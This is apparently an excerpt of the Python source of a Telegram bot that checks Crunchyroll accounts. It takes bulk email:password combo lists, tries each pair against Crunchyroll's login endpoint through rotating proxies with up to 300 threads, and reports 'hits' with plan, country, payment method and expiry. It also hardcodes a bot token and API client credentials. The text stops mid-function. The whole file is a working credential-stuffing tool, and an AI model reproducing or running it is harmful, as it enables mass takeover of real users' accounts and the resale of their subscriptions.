#!/usr/bin/env python3

import asyncio, requests, json, uuid, time, re, sys, io, secrets, sqlite3, traceback, logging
from datetime import datetime, timezone, UTC
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from typing import Dict, Optional, List, Set, Tuple, Union
from dataclasses import dataclass, field
from html import escape as html_escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode
from telegram.error import TimedOut, Forbidden, RetryAfter, BadRequest
import httpx

# ── Logging ──────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# ==================== CONFIG ====================
BOT_TOKEN = "8974919847:AAFh4RVX9z8L3sUYVWgTm5DS3wGSQNHcpMU"
OWNER_ID = 8406082965
CHANNEL_LINK = "https://t.me/uminoox"
CHANNEL_ID = -1004370504156
MAX_RETRIES = 3
MAX_RETRIES_ADMIN = 8
POST_AUTH_RETRIES = 3
DEFAULT_THREADS = 300
MAX_THREADS = 300
MAX_MASS_CHECK = 15
MAX_BULK_LINES = 100000
DB_FILE = "user_database.db"
EXECUTOR_MAX_WORKERS = 300
THROTTLE_INTERVAL = 3.0
PENDING_DETECT_TIMEOUT = 120
DOWNLOAD_RETRIES = 2
BROADCAST_DELAY = 0.05

# Proxy testing concurrency and throttling
PROXY_TEST_CONCURRENCY = 50
PROXY_UI_UPDATE_INTERVAL = 2.0
PROXY_DB_SAVE_INTERVAL = 10.0
PROXY_DB_SAVE_BATCH = 50

# Telegram rate limiter
TG_RATE_LIMIT = 25
TG_PER_CHAT_INTERVAL = 0.05
TG_MAX_RETRIES = 5
TG_BACKOFF_BASE = 1.0

db_lock = Lock()
RETRYABLE_STATUS = {403, 407, 429, 502, 503, 504}

TRANSIENT_ERRORS = [
    "No token/id", "No token", "No subscription", "subscription.not_found",
    "Failed to get", "timeout", "Connection reset", "Internal Server Error",
    "Service Unavailable", "Bad Gateway", "Gateway Timeout"
]

def is_transient_error(error_msg: str) -> bool:
    if not error_msg:
        return False
    error_lower = error_msg.lower()
    return any(te.lower() in error_lower for te in TRANSIENT_ERRORS)

admin_ids: Set[int] = {OWNER_ID}

# ── UI Design System ─────────────────────────────────────────
# Telegram HTML supports: <b>, <i>, <u>, <s>, <code>, <pre>, <a>
# Buttons: InlineKeyboardButton text only (no HTML inside buttons)
# Symbols used: purely non-coloured Unicode — no coloured emoji

DIV  = "━━━━━━━━━━━━━━━━━━━━━━"   # section divider
SDIV = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"  # soft divider

# Non-coloured symbol set (replaces all coloured emoji)
SYM = {
    "hit":       "◉",   # premium / success
    "free":      "◌",   # free / no sub
    "fail":      "✗",   # fail / invalid
    "proxy":     "◈",   # proxy
    "check":     "◎",   # checking
    "crown":     "◆",   # owner / admin
    "key":       "▣",   # key / field marker
    "stop":      "■",   # stop
    "back":      "◂",   # back
    "rocket":    "▶",   # launch / run
    "star":      "✦",   # star / highlight
    "globe":     "◎",   # globe / ip
    "lock":      "▪",   # locked
    "unlock":    "▫",   # unlocked
    "clock":     "◷",   # time
    "user":      "◑",   # user
    "users":     "◐",   # users
    "gear":      "◧",   # settings
    "trash":     "▽",   # delete
    "warning":   "▲",   # warning
    "refresh":   "↺",   # refresh / duplicate
    "stats":     "▤",   # stats
    "dup":       "↻",   # duplicate removed
    "mass":      "▦",   # mass check
    "split":     "◫",   # split
    "proxy_fail":"◇",   # proxy fail
    "test":      "◈",   # test
    "filter":    "▧",   # filter
    "admin":     "◆",   # admin
    "broadcast": "▷",   # broadcast
    "bullet":    "▸",   # bullet point
    "field":     "▣",   # field row
    "sep":       "·",   # separator
    "dot":       "•",   # dot
}

COPYRIGHT = "© Developer : @iam_eshh"

user_proxies: Dict[int, List[str]] = {}
user_tasks: Dict[int, Dict] = {}
user_bulk_active = {}
running_tasks: Dict[int, asyncio.Task] = {}

pending_bulk: Dict[str, Tuple[List[Tuple[str,str]], int]] = {}
user_pending_detect: Dict[int, float] = {}

executor = ThreadPoolExecutor(max_workers=EXECUTOR_MAX_WORKERS)

# ── Telegram Rate Limiter & Safe Wrappers ─────────────────────
class TelegramRateLimiter:
    def __init__(self, rate: int = TG_RATE_LIMIT):
        self.rate = rate
        self.min_interval = 1.0 / rate
        self.last_call = 0.0
        self.lock = asyncio.Lock()
        self.chat_last: Dict[int, float] = {}

    async def acquire(self, chat_id: Optional[int] = None):
        async with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_call
            if elapsed < self.min_interval:
                await asyncio.sleep(self.min_interval - elapsed)
            now = time.monotonic()
            self.last_call = now
            if chat_id is not None:
                last = self.chat_last.get(chat_id, 0.0)
                if now - last < TG_PER_CHAT_INTERVAL:
                    await asyncio.sleep(TG_PER_CHAT_INTERVAL - (now - last))
                    now = time.monotonic()
                    self.last_call = now
                self.chat_last[chat_id] = now

tg_limiter = TelegramRateLimiter()

async def safe_send_message(bot, chat_id, text, parse_mode=ParseMode.HTML, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_message failed: {e}")
                raise

async def safe_edit_message_text(bot, chat_id, message_id, text, parse_mode=ParseMode.HTML, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode, **kwargs)
        except BadRequest as e:
            if "message is not modified" in str(e).lower():
                return None
            else:
                logger.warning(f"BadRequest in edit_message_text: {e}")
                return None
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"edit_message_text failed: {e}")
                raise

async def safe_reply_text(message, text, parse_mode=ParseMode.HTML, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(message.chat_id)
            return await message.reply_text(text, parse_mode=parse_mode, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"reply_text failed: {e}")
                raise

async def safe_delete_message(bot, chat_id, message_id):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"delete_message failed: {e}")
                raise

async def safe_send_document(bot, chat_id, document, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_document(chat_id=chat_id, document=document, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_document failed: {e}")
                raise

async def safe_send_photo(bot, chat_id, photo, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_photo(chat_id=chat_id, photo=photo, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_photo failed: {e}")
                raise

async def safe_send_video(bot, chat_id, video, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_video(chat_id=chat_id, video=video, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_video failed: {e}")
                raise

async def safe_send_audio(bot, chat_id, audio, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_audio(chat_id=chat_id, audio=audio, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_audio failed: {e}")
                raise

async def safe_send_voice(bot, chat_id, voice, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_voice(chat_id=chat_id, voice=voice, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_voice failed: {e}")
                raise

async def safe_send_sticker(bot, chat_id, sticker, **kwargs):
    for attempt in range(TG_MAX_RETRIES):
        try:
            await tg_limiter.acquire(chat_id)
            return await bot.send_sticker(chat_id=chat_id, sticker=sticker, **kwargs)
        except (RetryAfter, TimedOut) as e:
            retry_after = getattr(e, 'retry_after', TG_BACKOFF_BASE * (2 ** attempt))
            await asyncio.sleep(retry_after)
        except Exception as e:
            if attempt < TG_MAX_RETRIES - 1:
                await asyncio.sleep(TG_BACKOFF_BASE * (2 ** attempt))
            else:
                logger.error(f"send_sticker failed: {e}")
                raise

# ── HTML escape helper ──────────────────────────────────────
def escape_html(text: str) -> str:
    if not isinstance(text, str):
        text = str(text)
    return html_escape(text, quote=False)

class ThrottledEditor:
    def __init__(self, message, interval=THROTTLE_INTERVAL):
        self.message = message
        self.interval = interval
        self.last_update = 0
        self.last_text = ""
        self._lock = asyncio.Lock()
        self.bot = message.get_bot()

    async def edit(self, text):
        now = time.monotonic()
        if now - self.last_update < self.interval:
            return
        if text == self.last_text:
            return
        async with self._lock:
            if time.monotonic() - self.last_update < self.interval:
                return
            if text == self.last_text:
                return
            try:
                await safe_edit_message_text(self.bot, self.message.chat_id, self.message.message_id, text, parse_mode=ParseMode.HTML)
                self.last_update = time.monotonic()
                self.last_text = text
            except Exception:
                pass

# ── Proxy helpers ───────────────────────────────────────────
PROXY_TEST_ENDPOINTS = [
    ("https://beta-api.crunchyroll.com/auth/v1/token", {"User-Agent": "Crunchyroll/ANDROIDTV"}),
    ("http://httpbin.org/ip", {}),
    ("https://api.ipify.org?format=json", {}),
]

async def test_proxy_health(proxy_url: str) -> bool:
    for url, headers in PROXY_TEST_ENDPOINTS:
        try:
            resp = await asyncio.get_running_loop().run_in_executor(
                executor,
                lambda: requests.get(url, proxies={"http": proxy_url, "https": proxy_url},
                                     timeout=6, headers=headers)
            )
            if resp.status_code < 400:
                return True
        except Exception:
            continue
    return False

IP_ECHO_SERVICES = [
    ("http://httpbin.org/ip", lambda r: r.json().get("origin", "Unknown")),
    ("https://api.ipify.org?format=json", lambda r: r.json().get("ip", "Unknown")),
    ("https://checkip.amazonaws.com", lambda r: r.text.strip()),
    ("http://icanhazip.com", lambda r: r.text.strip()),
]

async def fetch_exit_ip(proxy_url: str) -> Optional[str]:
    for url, parser in IP_ECHO_SERVICES:
        try:
            resp = await asyncio.get_running_loop().run_in_executor(
                executor,
                lambda: requests.get(url, proxies={"http": proxy_url, "https": proxy_url}, timeout=8)
            )
            if resp.status_code == 200:
                return parser(resp)
        except Exception:
            continue
    return None

def mask_proxy(proxy):
    return re.sub(r'(://[^:]+:)[^@]+(@)', r'\1***\2', proxy)

async def _reply(update: Update, text: str, **kwargs):
    if update.effective_message:
        return await safe_reply_text(update.effective_message, text, **kwargs)
    return None

def parse_proxy_input(raw: str) -> Optional[str]:
    raw = raw.strip()
    if not raw: return None
    if raw.startswith(("http://","https://","socks5://","socks4://")): return raw
    if '@' in raw: return f"http://{raw}"
    parts = raw.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{raw}"
    return None

def extract_combos(text: str) -> List[Tuple[str, str]]:
    pattern = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)')
    matches = pattern.findall(text)
    combos = []
    for email, password in matches:
        password = password.strip().split('|')[0].strip()
        if ' ' in password:
            password = password.split()[0]
        combos.append((email, password))
    return combos

def extract_combos_from_lines(lines: List[str]) -> List[Tuple[str, str]]:
    pattern = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)')
    combos = []
    for line in lines:
        matches = pattern.findall(line)
        for email, password in matches:
            password = password.strip().split('|')[0].strip()
            if ' ' in password:
                password = password.split()[0]
            combos.append((email, password))
    return combos

def is_email_pass_line(line: str) -> bool:
    pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\s*:\s*[^\s|]+')
    return bool(pattern.match(line.strip()))

async def download_file_with_retries(ctx, file_id, timeout=600, retries=DOWNLOAD_RETRIES):
    last_exception = None
    for attempt in range(1, retries + 1):
        try:
            file = await ctx.bot.get_file(file_id, read_timeout=timeout)
            content = await file.download_as_bytearray()
            return content.decode('utf-8')
        except (TimedOut, Exception) as e:
            logger.warning(f"Download attempt {attempt} failed: {e}")
            last_exception = e
            if attempt < retries:
                await asyncio.sleep(2 ** attempt)
    raise last_exception if last_exception else Exception("Download failed after retries")

# ==================== DATABASE ====================
def init_database():
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT DEFAULT 'Unknown',
            total_checked INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            total_free INTEGER DEFAULT 0, total_fail INTEGER DEFAULT 0,
            total_proxy_fail INTEGER DEFAULT 0)''')
        for col in [("proxy_list","TEXT DEFAULT '[]'"), ("threads","INTEGER DEFAULT 100")]:
            try: cur.execute(f"ALTER TABLE users ADD COLUMN {col[0]} {col[1]}")
            except: pass
        cur.execute('''CREATE TABLE IF NOT EXISTS admin_proxy (id INTEGER PRIMARY KEY, proxy_list TEXT DEFAULT '[]')''')
        cur.execute('''CREATE TABLE IF NOT EXISTS admin_config (key TEXT PRIMARY KEY, value TEXT)''')
        conn.commit(); conn.close()

def load_all_user_proxies():
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        try:
            cur.execute("SELECT user_id, proxy_list FROM users WHERE proxy_list IS NOT NULL AND proxy_list != '[]'")
            rows = cur.fetchall()
        except:
            rows = []
        conn.close()
    for uid, proxy_json in rows:
        try:
            proxies = json.loads(proxy_json)
            if proxies:
                user_proxies[uid] = proxies
        except:
            pass

def get_admin_proxies() -> List[str]:
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        try:
            cur.execute("SELECT proxy_list FROM admin_proxy WHERE id=1")
            row = cur.fetchone()
            if row: return json.loads(row[0])
        except: pass
        return []

def set_admin_proxies(proxies: List[str]):
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        cur.execute("INSERT OR REPLACE INTO admin_proxy (id, proxy_list) VALUES (1, ?)", (json.dumps(proxies),))
        conn.commit(); conn.close()

def ensure_user_in_db(user_id: int, username: str = "Unknown"):
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        cur.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, username))
        conn.commit(); conn.close()

def load_user_from_db(uid):
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        try: cur.execute('SELECT * FROM users WHERE user_id=?',(uid,)); row=cur.fetchone()
        except: row=None
        conn.close()
        if row:
            cols=[d[0] for d in cur.description]; d=dict(zip(cols,row))
            proxies = json.loads(d.get('proxy_list','[]'))
            return {'user_id':d['user_id'],'username':d.get('username','?'),
                    'total_checked':d.get('total_checked',0),'total_hits':d.get('total_hits',0),
                    'total_free':d.get('total_free',0),'total_fail':d.get('total_fail',0),
                    'total_proxy_fail':d.get('total_proxy_fail',0),
                    'proxies':proxies}
        return None

def save_user_proxies(uid, proxies):
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        proxy_json = json.dumps(proxies)
        cur.execute('INSERT OR REPLACE INTO users (user_id, proxy_list) VALUES (?, ?)', (uid, proxy_json))
        conn.commit(); conn.close()

def update_user_stats(uid, hit=0, free=0, fail=0, proxy_fail=0):
    with db_lock:
        conn=sqlite3.connect(DB_FILE); cur=conn.cursor()
        cur.execute('''UPDATE users SET total_checked=total_checked+?,total_hits=total_hits+?,
            total_free=total_free+?,total_fail=total_fail+?,total_proxy_fail=total_proxy_fail+?
            WHERE user_id=?''',(hit+free+fail+proxy_fail,hit,free,fail,proxy_fail,uid))
        conn.commit(); conn.close()

def get_all_user_ids() -> List[int]:
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        try:
            cur.execute("SELECT user_id FROM users")
            rows = cur.fetchall()
        except:
            rows = []
        conn.close()
    return [row[0] for row in rows]

def get_admin_config(key: str) -> Optional[str]:
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        try:
            cur.execute("SELECT value FROM admin_config WHERE key=?", (key,))
            row = cur.fetchone()
            if row:
                return row[0]
        except:
            pass
        finally:
            conn.close()
    return None

def set_admin_config(key: str, value: str):
    with db_lock:
        conn = sqlite3.connect(DB_FILE); cur = conn.cursor()
        cur.execute("INSERT OR REPLACE INTO admin_config (key, value) VALUES (?, ?)", (key, value))
        conn.commit(); conn.close()

init_database()
load_all_user_proxies()

bot_enabled_str = get_admin_config('bot_enabled')
BOT_ENABLED = True if bot_enabled_str is None else bot_enabled_str.lower() == 'true'
custom_msg_str = get_admin_config('custom_message')
CUSTOM_MESSAGE = json.loads(custom_msg_str) if custom_msg_str else None

def get_effective_proxies(user_id: int) -> List[str]:
    if user_id not in user_proxies:
        data = load_user_from_db(user_id)
        if data and data.get('proxies'):
            user_proxies[user_id] = data['proxies']
    personal = user_proxies.get(user_id, [])
    if personal:
        return personal
    admin = get_admin_proxies()
    return admin

def is_using_admin_proxy(user_id: int) -> bool:
    return not user_proxies.get(user_id) and bool(get_admin_proxies())

def get_max_retries(user_id: int) -> int:
    return MAX_RETRIES_ADMIN if is_using_admin_proxy(user_id) else MAX_RETRIES

# ── Crunchyroll Checker ──────────────────────────────────────
PROXY_ERR_KW=["Retries exhausted","Proxy error","Connection error","Timeout","Failed after","Proxy exhausted","All proxies exhausted"]
def is_proxy_error(msg): return any(k in msg for k in PROXY_ERR_KW)

class CrunchyrollChecker:
    def __init__(self,username,password,proxies=None, max_retries=MAX_RETRIES, post_auth_retries=POST_AUTH_RETRIES):
        self.username=username; self.password=password
        self.proxies=proxies if proxies else []
        self.max_retries = max_retries
        self.post_auth_retries = post_auth_retries
        self.session=requests.Session(); self.device_id=str(uuid.uuid4()); self.etp_id=str(uuid.uuid4())
        self.access_token=self.account_id=self.external_id=self.crunchy_username=None
        self.proxy_rotations=0; self._stop=False
    def stop(self): self._stop=True
    def _req(self,method,url,headers,data=None):
        if self._stop: raise Exception("Stopped")
        if not self.proxies:
            for attempt in range(1, self.max_retries+1):
                if self._stop: raise Exception("Stopped")
                try:
                    resp=self.session.post(url,headers=headers,data=data,timeout=20) if method=="POST" else self.session.get(url,headers=headers,timeout=20)
                    if resp.status_code in RETRYABLE_STATUS:
                        self.proxy_rotations+=1
                        if attempt<self.max_retries: time.sleep(1.5**attempt); continue
                        raise Exception(f"HTTP {resp.status_code} after {self.max_retries} retries")
                    return resp
                except (requests.exceptions.ProxyError,requests.exceptions.Timeout,requests.exceptions.ConnectionError):
                    self.proxy_rotations+=1
                    if attempt<self.max_retries: time.sleep(1.5**attempt)
            raise Exception("Direct connection retries exhausted")
        else:
            for proxy in self.proxies:
                proxies={"http":proxy,"https":proxy}
                for attempt in range(1, self.max_retries+1):
                    if self._stop: raise Exception("Stopped")
                    try:
                        resp=self.session.post(url,headers=headers,data=data,proxies=proxies,timeout=6) if method=="POST" else self.session.get(url,headers=headers,proxies=proxies,timeout=6)
                        if resp.status_code in RETRYABLE_STATUS:
                            self.proxy_rotations+=1
                            if attempt<self.max_retries: time.sleep(1.5**attempt); continue
                            break
                        return resp
                    except (requests.exceptions.ProxyError,requests.exceptions.Timeout,requests.exceptions.ConnectionError):
                        self.proxy_rotations+=1
                        if attempt<self.max_retries: time.sleep(1.5**attempt)
            raise Exception("All proxies exhausted")
    def _safe(self,method,url,headers,data=None):
        try: return self._req(method,url,headers,data),None
        except Exception as e:
            if str(e) == "Stopped":
                raise
            return None,str(e)
    def get_token(self):
        url="https://beta-api.crunchyroll.com/auth/v1/token"
        headers={"host":"beta-api.crunchyroll.com","Accept":"application/json","Accept-Charset":"UTF-8","Accept-Encoding":"gzip","Connection":"Keep-Alive","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","ETP-Anonymous-ID":self.etp_id,"Request-Type":"SignIn","User-Agent":"Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"}
        data=f"grant_type=password&username={requests.utils.quote(self.username)}&password={requests.utils.quote(self.password)}&scope=offline_access&client_id=rjs0ltx0dbwkliwxdzdf&client_secret=4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s&device_type=ADITYA&device_id={self.device_id}&device_name=ADITYA_1SIPTEA"
        resp,err=self._safe("POST",url,headers,data)
        if err: return False,err if is_proxy_error(err) else f"Request failed: {err}"
        if 'access_token":"ey' in resp.text:
            self.access_token=json.loads(resp.text)['access_token']; return True,"Token obtained"
        if any(x in resp.text for x in ["invalid_grant","invalid_credentials"]): return False,"Invalid credentials"
        if "force_password_reset" in resp.text: return False,"Password reset required"
        return False,f"Auth failed (HTTP {resp.status_code})"
    def get_account_info(self):
        if not self.access_token: return False,"No token"
        url="https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
        headers={"host":"beta-api.crunchyroll.com","sec-ch-ua-platform":'"Android"',"authorization":f"Bearer {self.access_token}","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36","accept":"application/json, text/plain, */*","sec-ch-ua":'"Not?A_Brand";v="99", "Samsung Internet";v="28.0", "Chromium";v="130"',"sec-ch-ua-mobile":"?1","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://beta-api.crunchyroll.com","accept-encoding":"gzip, deflate, br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8","priority":"u=1, i"}
        resp,err=self._safe("GET",url,headers)
        if err: return False,err if is_proxy_error(err) else f"Failed: {err}"
        return True,{}
    def get_full_account_info(self):
        if not self.access_token: return False,"No token"
        url="https://www.crunchyroll.com/accounts/v1/me"
        headers={"host":"beta-api.crunchyroll.com","sec-ch-ua-platform":'"Android"',"authorization":f"Bearer {self.access_token}","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36","accept":"application/json, text/plain, */*","sec-ch-ua":'"Not?A_Brand";v="99", "Samsung Internet";v="28.0", "Chromium";v="130"',"sec-ch-ua-mobile":"?1","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8","priority":"u=1, i"}
        resp,err=self._safe("GET",url,headers)
        if err: return False,err if is_proxy_error(err) else f"Failed: {err}"
        d=resp.text
        self.external_id=re.search(r'external_id":"([^"]+)"',d); self.external_id=self.external_id.group(1) if self.external_id else None
        ev=re.search(r'"email_verified":(\w+)',d); ev=ev.group(1)=="true" if ev else False
        self.account_id=re.search(r'"account_id":"([^"]+)"',d); self.account_id=self.account_id.group(1) if self.account_id else None
        self.crunchy_username=re.search(r'username":"([^"]+)"',d); self.crunchy_username=self.crunchy_username.group(1) if self.crunchy_username else self.username
        return True,{'email_verified':ev,'username':self.crunchy_username}
    def get_benefits(self):
        if not self.access_token or not self.external_id: return False,"No token/id"
        url=f"https://www.crunchyroll.com/subs/v1/subscriptions/{self.external_id}/benefits"
        headers={"host":"beta-api.crunchyroll.com","sec-ch-ua-platform":'"Android"',"authorization":f"Bearer {self.access_token}","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36","accept":"application/json, text/plain, */*","sec-ch-ua":'"Not?A_Brand";v="99", "Samsung Internet";v="28.0", "Chromium";v="130"',"sec-ch-ua-mobile":"?1","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.crunchyroll.com/discover","accept-encoding":"gzip, deflate, br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8","priority":"u=1, i"}
        resp,err=self._safe("GET",url,headers)
        if err: return False,err if is_proxy_error(err) else f"Failed: {err}"
        d=resp.text
        if any(x in d for x in ["subscription.not_found",'"subscription_country":""','"total":0',"Subscription Not Found"]): return False,"No subscription"
        cc=re.search(r'"subscription_country":"([^"]+)"',d); cc=cc.group(1) if cc else ""
        if not cc: return False,"No country"
        ms=re.search(r'benefit":"concurrent_streams\.(\d+)"',d); ms=ms.group(1) if ms else "0"
        pm=re.search(r'"source":"([^"]+)"',d); pm=pm.group(1) if pm else "Unknown"
        return True,{'country_code':cc,'max_streams':ms,'payment_method':pm}
    def get_subscription_v3(self):
        if not self.access_token or not self.account_id: return False,"No token/id"
        url=f"https://www.crunchyroll.com/subs/v3/subscriptions/{self.account_id}"
        headers={"host":"beta-api.crunchyroll.com","sec-ch-ua-platform":'"Android"',"authorization":f"Bearer {self.access_token}","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36","accept":"application/json, text/plain, */*","sec-ch-ua":'"Not?A_Brand";v="99", "Samsung Internet";v="28.0", "Chromium";v="130"',"sec-ch-ua-mobile":"?1","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.crunchyroll.com/discover","accept-encoding":"gzip, deflate, br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8","priority":"u=1, i"}
        resp,err=self._safe("GET",url,headers)
        if err: return False,err if is_proxy_error(err) else f"Failed: {err}"
        d=resp.text
        sku=re.search(r'"sku":"([^"]+)"',d); sku=sku.group(1) if sku else "unknown"
        exp=re.search(r'"expiration_date":"([^"]+)T',d); exp=exp.group(1) if exp else "Unknown"
        ar=re.search(r'"auto_renew":(\w+)',d); ar=ar.group(1)=="true" if ar else False
        return True,{'sku':sku,'expiry':exp,'auto_renew':ar}
    def translate_country(self,cc):
        c={"US":"USA","GB":"UK","IN":"India","CA":"Canada","AU":"Australia","DE":"Germany","FR":"France","JP":"Japan","BR":"Brazil","IT":"Italy","ES":"Spain","MX":"Mexico","NL":"Netherlands","SE":"Sweden","PL":"Poland","RU":"Russia","TR":"Turkey","SA":"Saudi Arabia","KR":"South Korea","PH":"Philippines","ID":"Indonesia","TH":"Thailand","VN":"Vietnam","AR":"Argentina","CL":"Chile","CO":"Colombia","PE":"Peru","ZA":"South Africa","EG":"Egypt","NG":"Nigeria","AE":"UAE","SG":"Singapore","MY":"Malaysia","PK":"Pakistan","BD":"Bangladesh","PT":"Portugal","GR":"Greece"}
        return c.get(cc,cc)
    def translate_plan(self,streams,sku):
        plans={"4":"MEGA FAN MEMBER-[cr_fan_pack]","1":"FAN MEMBER-[cr_premium]","6":"ULTIMATE FAN MEMBER-[cr_premium_plus]"}
        return plans.get(streams,sku)
    def _retry_post_auth(self, func, *args):
        last_error = None
        for attempt in range(1, self.post_auth_retries + 1):
            if self._stop:
                raise Exception("Stopped")
            success, result = func(*args)
            if success:
